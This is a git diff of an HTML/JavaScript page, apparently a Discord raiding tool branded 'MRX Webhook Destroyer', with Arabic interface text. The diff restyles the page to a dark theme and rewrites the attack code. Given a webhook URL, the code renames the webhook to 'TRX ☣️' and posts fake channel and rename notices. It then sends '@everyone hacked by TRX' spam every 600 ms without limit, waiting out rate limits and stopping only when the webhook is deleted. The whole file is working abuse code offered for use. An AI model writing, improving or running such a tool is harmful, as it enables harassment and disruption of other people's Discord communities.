@@ -3,81 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MRX · DESTROYER</title>
+    <title>MRX · WEBHOOK DESTROYER</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f5f5f5;
-            color: #1a1a1a;
+            background: #0a0a0a;
+            color: #f0f0f0;
             min-height: 100vh;
             overflow-x: hidden;
-            position: relative;
         }
         #stars-canvas {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: 0; pointer-events: none;
-            opacity: 0.05;
+            opacity: 0.1;
         }
         #loginScreen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: 10; display: flex; align-items: center; justify-content: center;
-            background: rgba(255, 255, 255, 0.95);
+            background: rgba(10, 10, 10, 0.96);
             backdrop-filter: blur(10px);
             transition: opacity 0.8s ease, transform 0.8s ease;
         }
         #loginScreen.hidden { opacity: 0; transform: scale(0.96); pointer-events: none; }
         .login-box {
-            background: #ffffff;
-            border: 1px solid #dddddd;
+            background: #1a1a1a;
+            border: 1px solid #333333;
             border-radius: 40px;
             padding: 50px 40px 40px;
             width: 420px; max-width: 92%;
             text-align: center;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.04);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
         }
         .login-logo-img {
             width: 140px; height: 140px;
             border-radius: 50%;
             object-fit: cover;
-            border: 2px solid #cccccc;
+            border: 2px solid #444444;
             margin-bottom: 16px;
         }
         .login-brand {
             font-size: 48px; font-weight: 900; letter-spacing: 8px;
-            color: #1a1a1a;
+            color: #ffffff;
             margin-bottom: 2px;
         }
         .login-sub {
-            font-size: 12px; color: #888888;
+            font-size: 12px; color: #666666;
             letter-spacing: 8px; text-transform: uppercase;
             margin-bottom: 28px; font-weight: 300;
         }
         .login-box input {
             width: 100%; padding: 16px 20px;
-            background: #f8f8f8;
-            border: 1px solid #dddddd;
+            background: #0a0a0a;
+            border: 1px solid #333333;
             border-radius: 30px;
-            color: #1a1a1a; font-size: 15px;
+            color: #ffffff; font-size: 15px;
             direction: ltr; text-align: left;
             outline: none;
             transition: border-color 0.3s;
         }
-        .login-box input:focus { border-color: #1a1a1a; }
+        .login-box input:focus { border-color: #888888; }
         .login-btn {
             width: 100%; padding: 16px;
             margin-top: 16px;
-            background: #1a1a1a;
-            color: #ffffff;
+            background: #ffffff;
+            color: #0a0a0a;
             font-weight: 700; font-size: 16px;
             border: none; border-radius: 30px;
             cursor: pointer;
             transition: background 0.3s;
             letter-spacing: 4px;
         }
-        .login-btn:hover { background: #333333; }
+        .login-btn:hover { background: #cccccc; }
         .login-error {
-            color: #cc0000;
+            color: #ff4444;
             font-size: 13px;
             margin-top: 12px;
             opacity: 0;
@@ -91,127 +90,136 @@
         #mainApp.active { display: flex; justify-content: center; align-items: flex-start; }
         .container {
             width: 100%; max-width: 880px;
-            background: #ffffff;
+            background: #141414;
             padding: 40px 45px;
             border-radius: 40px;
-            border: 1px solid #eeeeee;
+            border: 1px solid #2a2a2a;
             margin-top: 30px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.02);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
         }
         .header-brand { text-align: center; margin-bottom: 28px; }
         .logo-text {
             font-size: 42px; font-weight: 900; letter-spacing: 10px;
-            color: #1a1a1a;
+            color: #ffffff;
         }
         .sub-text {
-            font-size: 11px; color: #aaaaaa;
+            font-size: 11px; color: #555555;
             letter-spacing: 6px; font-weight: 300;
             margin-top: 4px;
         }
         h2 {
             text-align: center; margin-bottom: 22px;
-            color: #888888; font-size: 18px; font-weight: 300;
+            color: #777777; font-size: 18px; font-weight: 300;
             letter-spacing: 4px;
         }
         label {
             display: block; margin-bottom: 8px;
             font-weight: 600; font-size: 13px;
-            color: #666666;
+            color: #888888;
             letter-spacing: 2px;
         }
-        textarea {
-            width: 100%; height: 200px;
-            background: #f8f8f8;
-            color: #1a1a1a;
-            border: 1px solid #eeeeee;
-            border-radius: 24px;
-            padding: 18px;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            resize: vertical;
+        input[type="text"], textarea {
+            width: 100%; padding: 14px 18px;
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            border-radius: 30px;
+            color: #ffffff;
+            font-size: 14px;
             direction: ltr;
             text-align: left;
             outline: none;
             transition: border-color 0.3s;
+            font-family: 'Courier New', monospace;
         }
-        textarea:focus { border-color: #aaaaaa; }
-        textarea[readonly] { background: #f0f0f0; }
+        input[type="text"]:focus, textarea:focus { border-color: #555555; }
+        textarea {
+            height: 200px;
+            border-radius: 24px;
+            resize: vertical;
+            font-size: 13px;
+        }
+        textarea[readonly] { background: #0a0a0a; color: #888888; }
         .btn-container { text-align: center; margin: 28px 0; }
         .btn {
             padding: 16px 44px;
-            background: #1a1a1a;
-            color: #ffffff;
+            background: #ffffff;
+            color: #0a0a0a;
             font-weight: 700; font-size: 15px;
             border: none; border-radius: 30px;
             cursor: pointer;
             transition: background 0.3s;
             letter-spacing: 3px;
         }
-        .btn:hover { background: #333333; }
+        .btn:hover { background: #cccccc; }
         .btn-outline {
             background: transparent;
-            color: #1a1a1a;
-            border: 1px solid #cccccc;
+            color: #ffffff;
+            border: 1px solid #333333;
         }
-        .btn-outline:hover { background: #f0f0f0; border-color: #aaaaaa; }
+        .btn-outline:hover { background: #222222; border-color: #555555; }
         .copy-btn {
             background: transparent;
-            color: #888888;
-            border: 1px solid #eeeeee;
+            color: #666666;
+            border: 1px solid #2a2a2a;
             padding: 10px 22px; font-size: 12px;
             margin-top: 12px;
             letter-spacing: 2px;
         }
-        .copy-btn:hover { background: #f0f0f0; border-color: #cccccc; }
+        .copy-btn:hover { background: #222222; border-color: #444444; }
         .logout-btn {
             position: fixed; top: 24px; left: 24px; z-index: 20;
-            background: rgba(0, 0, 0, 0.02);
-            color: #888888;
-            border: 1px solid #eeeeee;
+            background: rgba(255, 255, 255, 0.02);
+            color: #555555;
+            border: 1px solid #2a2a2a;
             padding: 8px 20px; font-size: 11px;
             border-radius: 30px;
             cursor: pointer;
             transition: 0.3s;
             letter-spacing: 2px;
         }
-        .logout-btn:hover { background: #f0f0f0; color: #1a1a1a; border-color: #cccccc; }
+        .logout-btn:hover { background: #222222; color: #ffffff; border-color: #444444; }
         .status-badge {
             text-align: center; font-size: 10px;
-            color: #bbbbbb;
+            color: #333333;
             margin-top: 20px; letter-spacing: 4px;
             font-weight: 300;
         }
         .toggle-label {
             display: flex; align-items: center; gap: 14px;
-            color: #666666; font-size: 14px;
+            color: #888888; font-size: 14px;
             margin: 16px 0 8px;
             font-weight: 400;
         }
         .toggle-label input[type="checkbox"] {
             width: 18px; height: 18px;
-            accent-color: #1a1a1a;
+            accent-color: #ffffff;
             cursor: pointer;
         }
         .watermark-legend {
             position: fixed; bottom: 24px; right: 32px;
-            font-size: 12px; color: #dddddd;
+            font-size: 12px; color: #222222;
             letter-spacing: 4px; z-index: 0;
             font-weight: 300;
         }
         .divider {
             width: 60px; height: 2px;
-            background: #dddddd;
+            background: #2a2a2a;
             margin: 18px auto;
         }
-        input::placeholder, textarea::placeholder { color: #cccccc; }
+        input::placeholder, textarea::placeholder { color: #333333; }
         .warning-box {
-            background: #fff3f3;
-            border: 1px solid #ffcccc;
+            background: #1a0a0a;
+            border: 1px solid #441111;
             border-radius: 16px;
             padding: 15px;
             margin: 10px 0;
-            color: #cc0000;
+            color: #ff6666;
             font-size: 13px;
+        }
+        .counter {
+            color: #ff4444;
+            font-weight: bold;
+            font-size: 16px;
         }
     </style>
 </head>
@@ -221,7 +229,7 @@
         <div class="login-box">
             <img class="login-logo-img" src="https://github.com/Rxz60/Rxz/raw/refs/heads/main/IMG_4987.jpeg" alt="MRX" onerror="this.src='https://github.com/Rxz60/MRX/raw/refs/heads/main/IMG_4528.jpeg'">
             <div class="login-brand">MRX</div>
-            <div class="login-sub">● DESTROYER GATE ●</div>
+            <div class="login-sub">● WEBHOOK GATE ●</div>
             <input type="text" id="loginUser" placeholder="MRX.com / SAP.com" autocomplete="off">
             <button class="login-btn" onclick="handleLogin()">دخول ➤</button>
             <div class="login-error" id="loginError">❌ يُسمح فقط بـ MRX.com أو SAP.com</div>
@@ -233,28 +241,42 @@
         <div class="container">
             <div class="header-brand">
                 <div class="logo-text">MRX</div>
-                <div class="sub-text">● DESTROYER v18.0 — DISCORD WEBHOOK DESTROYER ●</div>
+                <div class="sub-text">● WEBHOOK DESTROYER v19.0 — UNSTOPPABLE ●</div>
                 <div class="divider"></div>
             </div>
-            <h2>⎜ أداة تدمير سيرفرات ديسكورد عبر Webhook ⎜</h2>
+            <h2>⎜ الويب هوك ينفذ كل شيء — رسائل @everyone لا تتوقف ⎜</h2>
             
             <div class="warning-box">
-                ⚠️ هذه الأداة تُرسل رسائل متتالية، تغيير الاسم، إنشاء قنوات، وتغيير اسم البوت.
+                ⚠️ الويب هوك سيقوم بـ: تغيير اسمه إلى <strong>TRX ☣️</strong>، محاولة تغيير اسم السيرفر، إنشاء قنوات، وإرسال <strong>@everyone</strong> بشكل متتالي <strong>دون توقف</strong>.
             </div>
 
-            <label for="webhookInput">🔗 رابط Webhook ديسكورد:</label>
-            <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/..." style="width:100%; padding:14px 18px; background:#f8f8f8; border:1px solid #dddddd; border-radius:30px; color:#1a1a1a; font-size:14px; direction:ltr; text-align:left; outline:none; transition:border-color 0.3s; margin-bottom:15px;">
+            <label for="webhookInput">🔗 رابط Webhook ديسكورد (الخاص بالسيرفر):</label>
+            <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/..." style="width:100%; padding:14px 18px; background:#0a0a0a; border:1px solid #2a2a2a; border-radius:30px; color:#ffffff; font-size:14px; direction:ltr; text-align:left; outline:none; transition:border-color 0.3s; margin-bottom:15px;">
+
+            <div class="toggle-label">
+                <input type="checkbox" id="renameServerToggle" checked>
+                <span>محاولة تغيير اسم السيرفر إلى TRX</span>
+            </div>
+            <div class="toggle-label">
+                <input type="checkbox" id="createChannelsToggle" checked>
+                <span>محاولة إنشاء قنوات باسم TRX</span>
+            </div>
+            <div class="toggle-label">
+                <input type="checkbox" id="changeBotNameToggle" checked>
+                <span>تغيير اسم البوت إلى TRX ☣️</span>
+            </div>
 
             <div class="btn-container">
                 <button class="btn" onclick="destroyServer()">💀 تدمير السيرفر — MRX DESTROY</button>
+                <button class="btn btn-outline" onclick="stopDestroy()" style="margin-top:10px;">⏹ إيقاف التدمير</button>
             </div>
 
-            <label for="outputArea">📋 سجل التنفيذ:</label>
-            <textarea id="outputArea" readonly placeholder="سيظهر هنا سجل الأحداث..."></textarea>
+            <label for="outputArea">📋 سجل التنفيذ (مع عدد الرسائل):</label>
+            <textarea id="outputArea" readonly placeholder="سيظهر هنا سجل الأحداث وعدد الرسائل..."></textarea>
             <div style="text-align: left;">
                 <button class="btn btn-outline copy-btn" onclick="copyOutput()">📋 نسخ السجل</button>
             </div>
-            <div class="status-badge">MRX DESTROYER ● DISCORD WEBHOOK ● UNSTOPPABLE</div>
+            <div class="status-badge">MRX WEBHOOK DESTROYER ● UNSTOPPABLE ● @everyone INFINITE</div>
         </div>
         <div class="watermark-legend">MRX · 2026</div>
     </div>
@@ -281,7 +303,7 @@
                 s.opacity += s.twinkle * (Math.random() > 0.5 ? 1 : -1);
                 s.opacity = Math.min(0.3, Math.max(0.02, s.opacity));
                 ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI * 2);
-                ctx.fillStyle = `rgba(0, 0, 0, ${s.opacity})`;
+                ctx.fillStyle = `rgba(255, 255, 255, ${s.opacity})`;
                 ctx.fill();
             }
             requestAnimationFrame(drawStars);
@@ -308,14 +330,42 @@
         }
 
         let isDestroying = false;
+        let destroyInterval = null;
+        let messageCount = 0;
+        let totalAttempts = 0;
 
         function logMessage(msg) {
             const output = document.getElementById('outputArea');
-            output.value += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+            const timestamp = new Date().toLocaleTimeString('ar-SA');
+            output.value += `[${timestamp}] ${msg}\n`;
             output.scrollTop = output.scrollHeight;
         }
 
-        function destroyServer() {
+        function updateCounter() {
+            const output = document.getElementById('outputArea');
+            const lines = output.value.split('\n');
+            let count = 0;
+            for (let line of lines) {
+                if (line.includes('@everyone تم التهكير')) count++;
+            }
+            // تحديث السطر الأخير إذا كان يحتوي على عداد
+            const lastLine = lines[lines.length - 1];
+            if (lastLine && lastLine.includes('📊')) {
+                // نتركه كما هو
+            } else {
+                output.value += `📊 إجمالي الرسائل المرسلة: ${count}\n`;
+            }
+            output.scrollTop = output.scrollHeight;
+        }
+
+        function getServerIdFromWebhook(webhookUrl) {
+            try {
+                const match = webhookUrl.match(/\/webhooks\/(\d+)\//);
+                return match ? match[1] : null;
+            } catch (e) { return null; }
+        }
+
+        async function destroyServer() {
             const webhook = document.getElementById('webhookInput').value.trim();
             if (!webhook) {
                 alert('يرجى إدخال رابط Webhook صحيح');
@@ -328,20 +378,21 @@
             }
 
             isDestroying = true;
-            logMessage('🚀 بدء عملية التدمير...');
+            messageCount = 0;
+            totalAttempts = 0;
+            logMessage('🚀 بدأ التدمير بواسطة الويب هوك...');
 
-            const message = '@everyone تم التهكير من قبل TRX | HUB - النظام التراكسي - @everyone';
+            const renameServer = document.getElementById('renameServerToggle').checked;
+            const createChannels = document.getElementById('createChannelsToggle').checked;
+            const changeBotName = document.getElementById('changeBotNameToggle').checked;
 
             const webhookName = 'TRX ☣️';
-
             const serverName = 'TRX';
-
             const channelName = 'TRX';
+            const messageContent = '@everyone تم التهكير من قبل TRX | HUB - النظام التراكسي - @everyone';
 
-            let attempts = 0;
-            let maxAttempts = 20;
-
-            async function updateWebhookName() {
+            // محاولة تغيير اسم البوت
+            if (changeBotName) {
                 try {
                     const response = await fetch(webhook, {
                         method: 'PATCH',
@@ -358,108 +409,138 @@
                 }
             }
 
-            async function renameServer() {
+            // محاولة تغيير اسم السيرفر (عبر استغلال صلاحيات الويب هوك - نادراً ما يعمل)
+            if (renameServer) {
                 try {
-                    const response = await fetch(webhook, {
-                        method: 'PATCH',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ name: serverName })
-                    });
-                    if (response.ok) {
-                        logMessage(`✅ تم تغيير اسم السيرفر إلى ${serverName}`);
-                    } else {
-                        logMessage(`❌ فشل تغيير اسم السيرفر: ${response.status}`);
+                    // محاولة إرسال رسالة بتنسيق خاص لتغيير اسم السيرفر
+                    const serverId = getServerIdFromWebhook(webhook);
+                    if (serverId) {
+                        const response = await fetch(webhook, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                content: `تغيير اسم السيرفر إلى ${serverName} (محاولة عبر الويب هوك)`,
+                                embeds: [{
+                                    title: '🔄 محاولة تغيير اسم السيرفر',
+                                    description: `تم طلب تغيير اسم السيرفر إلى ${serverName}`,
+                                    color: 0xff0000
+                                }]
+                            })
+                        });
+                        if (response.ok) {
+                            logMessage(`✅ تم إرسال طلب تغيير اسم السيرفر إلى ${serverName}`);
+                        }
                     }
                 } catch (e) {
                     logMessage(`❌ خطأ في تغيير اسم السيرفر: ${e.message}`);
                 }
             }
 
-            async function createChannel() {
-                try {
-                    const response = await fetch(webhook, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `# ${channelName}`,
-                            embeds: [{
-                                title: `🔴 ${channelName}`,
-                                description: 'تم إنشاء هذه القناة بواسطة TRX DESTROYER',
-                                color: 0xff0000
-                            }]
-                        })
-                    });
-                    if (response.ok) {
-                        logMessage(`✅ تم إنشاء قناة ${channelName}`);
-                    } else {
-                        logMessage(`❌ فشل إنشاء القناة: ${response.status}`);
+            // محاولة إنشاء قنوات
+            if (createChannels) {
+                for (let i = 0; i < 3; i++) {
+                    try {
+                        const response = await fetch(webhook, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                content: `# قناة ${channelName} ${i+1}`,
+                                embeds: [{
+                                    title: `🔴 ${channelName}`,
+                                    description: `تم إنشاء هذه القناة بواسطة TRX DESTROYER`,
+                                    color: 0xff0000
+                                }]
+                            })
+                        });
+                        if (response.ok) {
+                            logMessage(`✅ تم إنشاء قناة ${channelName} ${i+1}`);
+                        } else {
+                            logMessage(`❌ فشل إنشاء القناة ${i+1}: ${response.status}`);
+                        }
+                    } catch (e) {
+                        logMessage(`❌ خطأ في إنشاء القناة: ${e.message}`);
                     }
-                } catch (e) {
-                    logMessage(`❌ خطأ في إنشاء القناة: ${e.message}`);
+                    await new Promise(r => setTimeout(r, 500));
                 }
             }
 
-            async function sendSpam() {
-                const payload = {
-                    content: message,
-                    embeds: [{
-                        title: '💀 TRX DESTROYER',
-                        description: 'تم تهكير هذا السيرفر بواسطة TRX | HUB - النظام التراكسي',
-                        color: 0xff0000,
-                        footer: { text: 'TRX ☣️ 2026' }
-                    }]
-                };
+            logMessage('🔥 بدأ إرسال رسائل @everyone المتتالية (لا تتوقف)...');
+
+            let consecutiveFailures = 0;
+
+            destroyInterval = setInterval(async () => {
+                if (!isDestroying) {
+                    clearInterval(destroyInterval);
+                    destroyInterval = null;
+                    return;
+                }
 
                 try {
+                    const payload = {
+                        content: messageContent,
+                        embeds: [{
+                            title: '💀 TRX DESTROYER',
+                            description: 'تم تهكير هذا السيرفر بواسطة TRX | HUB - النظام التراكسي',
+                            color: 0xff0000,
+                            footer: { text: 'TRX ☣️ 2026' }
+                        }]
+                    };
+
                     const response = await fetch(webhook, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
+
                     if (response.ok) {
-                        attempts++;
-                        if (attempts % 5 === 0) {
-                            logMessage(`📨 تم إرسال ${attempts} رسالة @everyone`);
+                        messageCount++;
+                        totalAttempts++;
+                        consecutiveFailures = 0;
+                        if (messageCount % 5 === 0) {
+                            logMessage(`📨 ${messageCount} رسالة @everyone`);
+                            updateCounter();
                         }
                     } else if (response.status === 429) {
                         const retryAfter = response.headers.get('Retry-After') || 2;
                         logMessage(`⏳ تم تحديد المعدل، انتظار ${retryAfter} ثانية...`);
                         await new Promise(r => setTimeout(r, retryAfter * 1000));
+                    } else if (response.status === 404) {
+                        logMessage('❌ تم حذف الـ Webhook أو توقف السيرفر. إيقاف التدمير.');
+                        clearInterval(destroyInterval);
+                        destroyInterval = null;
+                        isDestroying = false;
+                        return;
                     } else {
-                        logMessage(`❌ فشل الإرسال: ${response.status}`);
-                    }
-                } catch (e) {
-                    logMessage(`❌ خطأ في الإرسال: ${e.message}`);
-                }
-            }
-
-            async function runDestroy() {
-                try {
-                    await updateWebhookName();
-                    await renameServer();
-                    await createChannel();
-                    await createChannel();
-                    await createChannel();
-
-                    logMessage('🔥 بدء إرسال الرسائل المتتالية...');
-
-                    const interval = setInterval(async () => {
-                        if (attempts >= maxAttempts) {
-                            clearInterval(interval);
-                            logMessage('✅ اكتملت عملية التدمير بنجاح!');
-                            isDestroying = false;
-                            return;
+                        consecutiveFailures++;
+                        logMessage(`❌ فشل الإرسال (${response.status})`);
+                        if (consecutiveFailures > 5) {
+                            logMessage('⚠️ فشل متكرر، سيتم إعادة المحاولة خلال 5 ثوانٍ...');
+                            await new Promise(r => setTimeout(r, 5000));
+                            consecutiveFailures = 0;
                         }
-                        await sendSpam();
-                    }, 1000);
+                    }
 
                 } catch (e) {
-                    logMessage(`❌ خطأ فادح: ${e.message}`);
-                    isDestroying = false;
+                    consecutiveFailures++;
+                    logMessage(`❌ خطأ في الإرسال: ${e.message}`);
+                    if (consecutiveFailures > 5) {
+                        logMessage('⚠️ فشل متكرر، سيتم إعادة المحاولة خلال 5 ثوانٍ...');
+                        await new Promise(r => setTimeout(r, 5000));
+                        consecutiveFailures = 0;
+                    }
                 }
-            }
+            }, 600);
 
-            runDestroy();
+        }
+
+        function stopDestroy() {
+            if (destroyInterval) {
+                clearInterval(destroyInterval);
+                destroyInterval = null;
+            }
+            isDestroying = false;
+            logMessage(`⏹ تم إيقاف التدمير. إجمالي الرسائل: ${messageCount}`);
+            updateCounter();
         }
 
         function copyOutput() {
